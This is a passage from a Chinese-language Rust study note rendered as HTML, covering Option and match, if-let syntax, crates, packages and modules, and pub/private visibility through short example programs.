</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#note-cs-rust-rust-__codelineno-88-2"></a><span class="w">    </span><span class="nb">Some</span><span class="p">(</span><span class="n">T</span><span class="p">),</span>
</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#note-cs-rust-rust-__codelineno-88-3"></a><span class="w">    </span><span class="nb">None</span><span class="p">,</span>
</span><span id="__span-88-4"><a id="__codelineno-88-4" name="__codelineno-88-4" href="#note-cs-rust-rust-__codelineno-88-4"></a><span class="p">}</span>
</span><span id="__span-88-5"><a id="__codelineno-88-5" name="__codelineno-88-5" href="#note-cs-rust-rust-__codelineno-88-5"></a><span class="c1">//这提供了一种定义可以为空值的类的方法</span>
</span><span id="__span-88-6"><a id="__codelineno-88-6" name="__codelineno-88-6" href="#note-cs-rust-rust-__codelineno-88-6"></a><span class="c1">//let opt = Option::Some(&quot;Hello&quot;);</span>
</span></code></pre></div>
<p>如果你想针对 <code>opt</code> 执行某些操作，你必须先判断它是否是 <code>Option::None</code>：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#note-cs-rust-rust-__codelineno-89-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#note-cs-rust-rust-__codelineno-89-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">opt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Option</span>::<span class="nb">Some</span><span class="p">(</span><span class="s">&quot;Hello&quot;</span><span class="p">);</span>
</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3" href="#note-cs-rust-rust-__codelineno-89-3"></a><span class="w">    </span><span class="k">match</span><span class="w"> </span><span class="n">opt</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4" href="#note-cs-rust-rust-__codelineno-89-4"></a><span class="w">        </span><span class="nb">Option</span>::<span class="nb">Some</span><span class="p">(</span><span class="n">something</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5" href="#note-cs-rust-rust-__codelineno-89-5"></a><span class="w">            </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">something</span><span class="p">);</span>
</span><span id="__span-89-6"><a id="__codelineno-89-6" name="__codelineno-89-6" href="#note-cs-rust-rust-__codelineno-89-6"></a><span class="w">        </span><span class="p">},</span>
</span><span id="__span-89-7"><a id="__codelineno-89-7" name="__codelineno-89-7" href="#note-cs-rust-rust-__codelineno-89-7"></a><span class="w">        </span><span class="nb">Option</span>::<span class="nb">None</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-89-8"><a id="__codelineno-89-8" name="__codelineno-89-8" href="#note-cs-rust-rust-__codelineno-89-8"></a><span class="w">            </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;opt is nothing&quot;</span><span class="p">);</span>
</span><span id="__span-89-9"><a id="__codelineno-89-9" name="__codelineno-89-9" href="#note-cs-rust-rust-__codelineno-89-9"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-89-10"><a id="__codelineno-89-10" name="__codelineno-89-10" href="#note-cs-rust-rust-__codelineno-89-10"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-89-11"><a id="__codelineno-89-11" name="__codelineno-89-11" href="#note-cs-rust-rust-__codelineno-89-11"></a><span class="p">}</span>
</span></code></pre></div>
<p>如果你的变量刚开始是空值，你体谅一下编译器，它怎么知道值不为空的时候变量是什么类型的呢？</p>
<p>所以初始值为空的 Option 必须明确类型：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#note-cs-rust-rust-__codelineno-90-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#note-cs-rust-rust-__codelineno-90-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">opt</span>: <span class="nb">Option</span><span class="o">&lt;&amp;</span><span class="kt">str</span><span class="o">&gt;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Option</span>::<span class="nb">None</span><span class="p">;</span>
</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#note-cs-rust-rust-__codelineno-90-3"></a><span class="w">    </span><span class="k">match</span><span class="w"> </span><span class="n">opt</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#note-cs-rust-rust-__codelineno-90-4"></a><span class="w">        </span><span class="nb">Option</span>::<span class="nb">Some</span><span class="p">(</span><span class="n">something</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5" href="#note-cs-rust-rust-__codelineno-90-5"></a><span class="w">            </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">something</span><span class="p">);</span>
</span><span id="__span-90-6"><a id="__codelineno-90-6" name="__codelineno-90-6" href="#note-cs-rust-rust-__codelineno-90-6"></a><span class="w">        </span><span class="p">},</span>
</span><span id="__span-90-7"><a id="__codelineno-90-7" name="__codelineno-90-7" href="#note-cs-rust-rust-__codelineno-90-7"></a><span class="w">        </span><span class="nb">Option</span>::<span class="nb">None</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-90-8"><a id="__codelineno-90-8" name="__codelineno-90-8" href="#note-cs-rust-rust-__codelineno-90-8"></a><span class="w">            </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;opt is nothing&quot;</span><span class="p">);</span>
</span><span id="__span-90-9"><a id="__codelineno-90-9" name="__codelineno-90-9" href="#note-cs-rust-rust-__codelineno-90-9"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-90-10"><a id="__codelineno-90-10" name="__codelineno-90-10" href="#note-cs-rust-rust-__codelineno-90-10"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-90-11"><a id="__codelineno-90-11" name="__codelineno-90-11" href="#note-cs-rust-rust-__codelineno-90-11"></a><span class="p">}</span>
</span></code></pre></div>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>这种设计会让空值编程变得不容易，但这正是构建一个稳定高效的系统所需要的。由于 Option 是 Rust 编译器默认引入的，在使用时可以省略 Option:: 直接写 None 或者 Some()。</p>
</div>
<p>Option 是一种特殊的枚举类，它可以含值分支选择：</p>
<div class="language-RUST highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#note-cs-rust-rust-__codelineno-91-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#note-cs-rust-rust-__codelineno-91-2"></a><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Some</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#note-cs-rust-rust-__codelineno-91-3"></a><span class="w">        </span><span class="k">match</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-91-4"><a id="__codelineno-91-4" name="__codelineno-91-4" href="#note-cs-rust-rust-__codelineno-91-4"></a><span class="w">                </span><span class="nb">Some</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Yes&quot;</span><span class="p">),</span>
</span><span id="__span-91-5"><a id="__codelineno-91-5" name="__codelineno-91-5" href="#note-cs-rust-rust-__codelineno-91-5"></a><span class="w">                </span><span class="n">_</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;No&quot;</span><span class="p">),</span>
</span><span id="__span-91-6"><a id="__codelineno-91-6" name="__codelineno-91-6" href="#note-cs-rust-rust-__codelineno-91-6"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-91-7"><a id="__codelineno-91-7" name="__codelineno-91-7" href="#note-cs-rust-rust-__codelineno-91-7"></a><span class="p">}</span>
</span></code></pre></div>
<h3 id="note-cs-rust-rust-if-let">if-let语法<a class="headerlink" href="#note-cs-rust-rust-if-let" title="Permanent link">&para;</a></h3>
<p>下面这段程序用于判断一个变量是否为0</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#note-cs-rust-rust-__codelineno-92-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#note-cs-rust-rust-__codelineno-92-2"></a><span class="k">match</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#note-cs-rust-rust-__codelineno-92-3"></a><span class="w">    </span><span class="mi">0</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;zero&quot;</span><span class="p">),</span>
</span><span id="__span-92-4"><a id="__codelineno-92-4" name="__codelineno-92-4" href="#note-cs-rust-rust-__codelineno-92-4"></a><span class="w">    </span><span class="n">_</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{},</span>
</span><span id="__span-92-5"><a id="__codelineno-92-5" name="__codelineno-92-5" href="#note-cs-rust-rust-__codelineno-92-5"></a><span class="p">}</span>
</span></code></pre></div>
使用<code>if-let</code>语法可以对它进行缩短</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#note-cs-rust-rust-__codelineno-93-1"></a><span class="kd">let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#note-cs-rust-rust-__codelineno-93-2"></a><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#note-cs-rust-rust-__codelineno-93-3"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;zero&quot;</span><span class="p">);</span>
</span><span id="__span-93-4"><a id="__codelineno-93-4" name="__codelineno-93-4" href="#note-cs-rust-rust-__codelineno-93-4"></a><span class="p">}</span>
</span></code></pre></div>
<p><code>if-let</code>语法的格式如下
<div class="language-rust highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#note-cs-rust-rust-__codelineno-94-1"></a><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="err">匹配值</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">源变量</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#note-cs-rust-rust-__codelineno-94-2"></a><span class="w">    </span><span class="err">语句块</span>
</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#note-cs-rust-rust-__codelineno-94-3"></a><span class="p">}</span>
</span></code></pre></div></p>
<details class="note">
<summary>Note</summary>
<p>if let 语法可以认为是只区分两种情况的 match 语句的"语法糖"（语法糖指的是某种语法的原理相同的便捷替代品）。</p>
</details>
<p>可以在之后添加一个 else 块来处理例外情况。
<div class="language-rust highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#note-cs-rust-rust-__codelineno-95-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#note-cs-rust-rust-__codelineno-95-2"></a><span class="w">    </span><span class="k">enum</span> <span class="nc">Book</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#note-cs-rust-rust-__codelineno-95-3"></a><span class="w">        </span><span class="n">Papery</span><span class="p">(</span><span class="kt">u32</span><span class="p">),</span>
</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#note-cs-rust-rust-__codelineno-95-4"></a><span class="w">        </span><span class="n">Electronic</span><span class="p">(</span><span class="nb">String</span><span class="p">)</span>
</span><span id="__span-95-5"><a id="__codelineno-95-5" name="__codelineno-95-5" href="#note-cs-rust-rust-__codelineno-95-5"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-95-6"><a id="__codelineno-95-6" name="__codelineno-95-6" href="#note-cs-rust-rust-__codelineno-95-6"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">book</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Book</span>::<span class="n">Electronic</span><span class="p">(</span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;url&quot;</span><span class="p">));</span>
</span><span id="__span-95-7"><a id="__codelineno-95-7" name="__codelineno-95-7" href="#note-cs-rust-rust-__codelineno-95-7"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="kd">let</span><span class="w"> </span><span class="n">Book</span>::<span class="n">Papery</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">book</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-95-8"><a id="__codelineno-95-8" name="__codelineno-95-8" href="#note-cs-rust-rust-__codelineno-95-8"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Papery {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">index</span><span class="p">);</span>
</span><span id="__span-95-9"><a id="__codelineno-95-9" name="__codelineno-95-9" href="#note-cs-rust-rust-__codelineno-95-9"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-95-10"><a id="__codelineno-95-10" name="__codelineno-95-10" href="#note-cs-rust-rust-__codelineno-95-10"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Not papery book&quot;</span><span class="p">);</span>
</span><span id="__span-95-11"><a id="__codelineno-95-11" name="__codelineno-95-11" href="#note-cs-rust-rust-__codelineno-95-11"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-95-12"><a id="__codelineno-95-12" name="__codelineno-95-12" href="#note-cs-rust-rust-__codelineno-95-12"></a><span class="p">}</span>
</span></code></pre></div></p>
<h3 id="note-cs-rust-rust-_36">组织管理<a class="headerlink" href="#note-cs-rust-rust-_36" title="Permanent link">&para;</a></h3>
<blockquote>
<p>我没太懂这个是要干嘛，直接抄的菜鸟教程</p>
<p>任何一门编程语言如果不能组织代码都是难以深入的，几乎没有一个软件产品是由一个源文件编译而成的。</p>
<p>到目前为止所有的程序都是在一个文件中编写的，主要是为了方便学习 Rust 语言的语法和概念。</p>
<p>对于一个工程来讲，组织代码是十分重要的。</p>
<p>Rust 中有三个重要的组织概念：箱、包、模块。</p>
</blockquote>
<p><strong>箱(Crate)</strong></p>
<p>"箱"是二进制程序文件或者库文件，存在于"包"中。</p>
<p>"箱"是树状结构的，它的树根是编译器开始运行时编译的源文件所编译的程序。</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>注意："二进制程序文件"不一定是"二进制可执行文件"，只能确定是是包含目标机器语言的文件，文件格式随编译环境的不同而不同.</p>
</div>
<p><strong>包(Package)</strong></p>
<p>当我们使用 Cargo 执行 new 命令创建 Rust 工程时，工程目录下会建立一个 Cargo.toml 文件。工程的实质就是一个包，包必须由一个 Cargo.toml 文件来管理，该文件描述了包的基本信息以及依赖项。</p>
<p>一个包最多包含一个库"箱"，可以包含任意数量的二进制"箱"，但是至少包含一个"箱"（不管是库还是二进制"箱"）。</p>
<p>当使用 cargo new 命令创建完包之后，src 目录下会生成一个 main.rs 源文件，Cargo 默认这个文件为二进制箱的根，编译之后的二进制箱将与包名相同。</p>
<p><strong>模块（Module）</strong>
对于一个软件工程来说，我们往往按照所使用的编程语言的组织规范来进行组织，组织模块的主要结构往往是树。Java 组织功能模块的主要单位是类，而 JavaScript 组织模块的主要方式是 function。</p>
<p>这些先进的语言的组织单位可以层层包含，就像文件系统的目录结构一样。Rust 中的组织单位是模块（Module）。</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#note-cs-rust-rust-__codelineno-96-1"></a><span class="k">mod</span> <span class="nn">nation</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#note-cs-rust-rust-__codelineno-96-2"></a><span class="w">    </span><span class="k">mod</span> <span class="nn">government</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3" href="#note-cs-rust-rust-__codelineno-96-3"></a><span class="w">        </span><span class="k">fn</span> <span class="nf">govern</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>
</span><span id="__span-96-4"><a id="__codelineno-96-4" name="__codelineno-96-4" href="#note-cs-rust-rust-__codelineno-96-4"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-96-5"><a id="__codelineno-96-5" name="__codelineno-96-5" href="#note-cs-rust-rust-__codelineno-96-5"></a><span class="w">    </span><span class="k">mod</span> <span class="nn">congress</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-96-6"><a id="__codelineno-96-6" name="__codelineno-96-6" href="#note-cs-rust-rust-__codelineno-96-6"></a><span class="w">        </span><span class="k">fn</span> <span class="nf">legislate</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>
</span><span id="__span-96-7"><a id="__codelineno-96-7" name="__codelineno-96-7" href="#note-cs-rust-rust-__codelineno-96-7"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-96-8"><a id="__codelineno-96-8" name="__codelineno-96-8" href="#note-cs-rust-rust-__codelineno-96-8"></a><span class="w">    </span><span class="k">mod</span> <span class="nn">court</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-96-9"><a id="__codelineno-96-9" name="__codelineno-96-9" href="#note-cs-rust-rust-__codelineno-96-9"></a><span class="w">        </span><span class="k">fn</span> <span class="nf">judicial</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>
</span><span id="__span-96-10"><a id="__codelineno-96-10" name="__codelineno-96-10" href="#note-cs-rust-rust-__codelineno-96-10"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-96-11"><a id="__codelineno-96-11" name="__codelineno-96-11" href="#note-cs-rust-rust-__codelineno-96-11"></a><span class="p">}</span>
</span></code></pre></div>
这是一段描述法治国家的程序：国家（nation）包括政府（government）、议会（congress）和法院（court），分别有行政、立法和司法的功能。我们可以把它转换成树状结构：
<div class="language-text highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#note-cs-rust-rust-__codelineno-97-1"></a>nation
</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2" href="#note-cs-rust-rust-__codelineno-97-2"></a> ├── government
</span><span id="__span-97-3"><a id="__codelineno-97-3" name="__codelineno-97-3" href="#note-cs-rust-rust-__codelineno-97-3"></a> │ └── govern
</span><span id="__span-97-4"><a id="__codelineno-97-4" name="__codelineno-97-4" href="#note-cs-rust-rust-__codelineno-97-4"></a> ├── congress
</span><span id="__span-97-5"><a id="__codelineno-97-5" name="__codelineno-97-5" href="#note-cs-rust-rust-__codelineno-97-5"></a> │ └── legislate
</span><span id="__span-97-6"><a id="__codelineno-97-6" name="__codelineno-97-6" href="#note-cs-rust-rust-__codelineno-97-6"></a> └── court
</span><span id="__span-97-7"><a id="__codelineno-97-7" name="__codelineno-97-7" href="#note-cs-rust-rust-__codelineno-97-7"></a>   └── judicial
</span></code></pre></div></p>
<p>在文件系统中，目录结构往往以斜杠在路径字符串中表示对象的位置，Rust 中的路径分隔符是 :: 。</p>
<p>路径分为绝对路径和相对路径。绝对路径从 crate 关键字开始描述。相对路径从 self 或 super 关键字或一个标识符开始描述。例如：
<div class="language-text highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#note-cs-rust-rust-__codelineno-98-1"></a>crate::nation::government::govern();
</span></code></pre></div>
是描述 govern 函数的绝对路径，相对路径可以表示为：
<div class="language-text highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#note-cs-rust-rust-__codelineno-99-1"></a>nation::government::govern();
</span></code></pre></div>
现在你可以尝试在一个源程序里定义类似的模块结构并在主函数中使用路径。</p>
<p>如果你这样做，你一定会发现它不正确的地方：government 模块和其中的函数都是私有（private）的，你不被允许访问它们。</p>
<h3 id="note-cs-rust-rust-_37">访问权限<a class="headerlink" href="#note-cs-rust-rust-_37" title="Permanent link">&para;</a></h3>
<p>Rust 中有两种简单的访问权：公共（public）和私有（private）。</p>
<p>默认情况下，如果不加修饰符，模块中的成员访问权将是私有的。</p>
<p>如果想使用公共权限，需要使用 pub 关键字。</p>
<p>对于私有的模块，只有在与其平级的位置或下级的位置才能访问，不能从其外部访问。
<div class="language-rust highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#note-cs-rust-rust-__codelineno-100-1"></a><span class="k">mod</span> <span class="nn">nation</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#note-cs-rust-rust-__codelineno-100-2"></a><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="k">mod</span> <span class="nn">government</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#note-cs-rust-rust-__codelineno-100-3"></a><span class="w">        </span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">govern</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>
</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4" href="#note-cs-rust-rust-__codelineno-100-4"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-100-5"><a id="__codelineno-100-5" name="__codelineno-100-5" href="#note-cs-rust-rust-__codelineno-100-5"></a>
</span><span id="__span-100-6"><a id="__codelineno-100-6" name="__codelineno-100-6" href="#note-cs-rust-rust-__codelineno-100-6"></a><span class="w">    </span><span class="k">mod</span> <span class="nn">congress</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-100-7"><a id="__codelineno-100-7" name="__codelineno-100-7" href="#note-cs-rust-rust-__codelineno-100-7"></a><span class="w">        </span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">legislate</span><span class="p">()</span><span class="w"> </span><span class="p">{}</span>
</span><span id="__span-100-8"><a id="__codelineno-100-8" name="__codelineno-100-8" href="#note-cs-rust-rust-__codelineno-100-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-100-9"><a id="__codelineno-100-9" name="__codelineno-100-9" href="#note-cs-rust-rust-__codelineno-100-9"></a>
</span><span id="__span-100-10"><a id="__codelineno-100-10" name="__codelineno-100-10" href="#note-cs-rust-rust-__codelineno-100-10"></a><span class="w">    </span><span class="k">mod</span> <span class="nn">court</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-100-11"><a id="__codelineno-100-11" name="__codelineno-100-11" href="#note-cs-rust-rust-__codelineno-100-11"></a><span class="w">        </span><span class="k">fn</span> <span class="nf">judicial</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-100-12"><a id="__codelineno-100-12" name="__codelineno-100-12" href="#note-cs-rust-rust-__codelineno-100-12"></a><span class="w">            </span><span class="k">super</span>::<span class="n">congress</span>::<span class="n">legislate</span><span class="p">();</span>
</span><span id="__span-100-13"><a id="__codelineno-100-13" name="__codelineno-100-13" href="#note-cs-rust-rust-__codelineno-100-13"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-100-14"><a id="__codelineno-100-14" name="__codelineno-100-14" href="#note-cs-rust-rust-__codelineno-100-14"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-100-15"><a id="__codelineno-100-15" name="__codelineno-100-15" href="#note-cs-rust-rust-__codelineno-100-15"></a><span class="p">}</span>
</span><span id="__span-100-16"><a id="__codelineno-100-16" name="__codelineno-100-16" href="#note-cs-rust-rust-__codelineno-100-16"></a>
</span><span id="__span-100-17"><a id="__codelineno-100-17" name="__codelineno-100-17" href="#note-cs-rust-rust-__codelineno-100-17"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-100-18"><a id="__codelineno-100-18" name="__codelineno-100-18" href="#note-cs-rust-rust-__codelineno-100-18"></a><span class="w">    </span><span class="n">nation</span>::<span class="n">government</span>::<span class="n">govern</span><span class="p">();</span>
</span><span id="__span-100-19"><a id="__codelineno-100-19" name="__codelineno-100-19" href="#note-cs-rust-rust-__codelineno-100-19"></a><span class="p">}</span>
</span></code></pre></div>
这段程序是能通过编译的。请注意观察 court 模块中 super 的访问方法。</p>
<p>如果模块中定义了结构体，结构体除了其本身是私有的以外，其字段也默认是私有的。所以如果想使用模块中的结构体以及其字段，需要 pub 声明：</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#note-cs-rust-rust-__codelineno-101-1"></a><span class="k">mod</span> <span class="nn">back_of_house</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#note-cs-rust-rust-__codelineno-101-2"></a><span class="w">    </span><span class="k">pub</span><span class="w"> </span><span class="k">struct</span> <span class="nc">Breakfast</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#note-cs-rust-rust-__codelineno-101-3"></a><span class="w">        </span><span class="k">pub</span><span class="w"> </span><span class="n">toast</span>: <span class="nb">String</span><span class="p">,</span>
</span><span id="__span-101-4"><a id="__codelineno-101-4" name="__codelineno-101-4" href="#note-cs-rust-rust-__codelineno-101-4"></a><span class="w">        </span><span class="n">seasonal_fruit</span>: <span class="nb">String</span><span class="p">,</span>
</span><span id="__span-101-5"><a id="__codelineno-101-5" name="__codelineno-101-5" href="#note-cs-rust-rust-__codelineno-101-5"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-101-6"><a id="__codelineno-101-6" name="__codelineno-101-6" href="#note-cs-rust-rust-__codelineno-101-6"></a>
</span><span id="__span-101-7"><a id="__codelineno-101-7" name="__codelineno-101-7" href="#note-cs-rust-rust-__codelineno-101-7"></a><span class="w">    </span><span class="k">impl</span><span class="w"> </span><span class="n">Breakfast</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-8"><a id="__codelineno-101-8" name="__codelineno-101-8" href="#note-cs-rust-rust-__codelineno-101-8"></a><span class="w">        </span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">summer</span><span class="p">(</span><span class="n">toast</span>: <span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nc">Breakfast</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-9"><a id="__codelineno-101-9" name="__codelineno-101-9" href="#note-cs-rust-rust-__codelineno-101-9"></a><span class="w">            </span><span class="n">Breakfast</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-101-10"><a id="__codelineno-101-10" name="__codelineno-101-10" href="#note-cs-rust-rust-__codelineno-101-10"></a><span class="w">                </span><span class="n">toast</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="n">toast</span><span class="p">),</span>
</span><span id="__span-101-11"><a id="__codelineno-101-11" name="__codelineno-101-11" href="#note-cs-rust-rust-__codelineno-101-11"></a><span class="w">                </span><span class="n">seasonal_fruit</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;peaches&quot;</span><span class="p">),</span>
</span><span id="__span-101-12"><a id="__codelineno-101-12" name="__codelineno-101-12" href="#note-cs-rust-rust-__codelineno-101-12"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-101-13"><a id="__codelineno-101-13" name="__codelineno-101-13" href="#note-cs-rust-rust-__codelineno-101-13"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-101-14"><a id="__codelineno-101-14" name="__codelineno-101-14" href="#note-cs-rust-rust-__codelineno-101-14"></a><span class="w">    </span><span class="p">}</span>
